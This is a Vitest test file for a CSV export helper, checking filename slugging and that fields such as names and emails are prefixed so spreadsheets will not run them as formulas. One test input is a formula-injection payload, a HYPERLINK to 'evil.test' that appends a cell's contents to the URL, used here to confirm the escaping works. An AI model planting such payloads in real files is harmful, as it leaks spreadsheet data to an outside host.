import { describe, expect, it } from "vitest";

import { csvField, csvFilename } from "./csv.js";

describe("csvFilename", () => {
  it("is the title's slug: accents folded, lower case, single dashes, capped", () => {
    expect(csvFilename("Test 0 — Bases du C (été)")).toBe("test-0-bases-du-c-ete.csv");
    expect(csvFilename("x".repeat(80))).toBe(`${"x".repeat(60)}.csv`);
  });

  it("falls back to `results` when the title has no usable character", () => {
    expect(csvFilename("—?!")).toBe("results.csv");
  });
});

describe("csvField", () => {
  /**
   * Finding M2: names and emails come from the roster import and from the
   * identity provider's claims, and the file is opened in Excel by the
   * teacher. Quoting does not stop a formula from running; the prefix does.
   */
  it("neutralises a field a spreadsheet would run as a formula", () => {
    // The prefix first, then the RFC-4180 quoting of the quotes it contains.
    expect(csvField('=HYPERLINK("http://evil.test?"&A1)')).toBe(
      `"'=HYPERLINK(""http://evil.test?""&A1)"`,
    );
    expect(csvField("+1 41 79")).toBe("'+1 41 79");
    expect(csvField("-2")).toBe("'-2");
    expect(csvField("@user")).toBe("'@user");
    expect(csvField("\tlead")).toBe("'\tlead");
    // …and a field that needs quoting is still quoted, prefix included.
    expect(csvField('=a;b"c')).toBe(`"'=a;b""c"`);
    // An ordinary field is untouched: the export stays diff-readable.
    expect(csvField("Dupond")).toBe("Dupond");
  });
});
